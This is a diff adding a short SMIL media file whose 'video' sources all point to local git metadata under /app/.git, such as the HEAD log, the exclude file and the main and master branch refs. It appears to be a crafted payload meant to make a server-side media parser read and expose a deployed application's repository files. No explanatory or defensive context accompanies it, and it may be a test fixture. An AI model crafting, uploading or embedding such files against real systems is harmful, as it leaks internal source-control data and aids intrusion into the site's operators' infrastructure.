@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="utf-8"?>
+<smil>
+  <body>
+    <switch>
+      <video src="/app/.git/info/exclude"/>
+      <video src="/app/.git/logs/HEAD"/>
+      <video src="/app/.git/refs/heads/main"/>
+      <video src="/app/.git/refs/heads/master"/>
+      <video src="/app/.git/logs/refs/heads/main"/>
+    </switch>
+  </body>
+</smil>
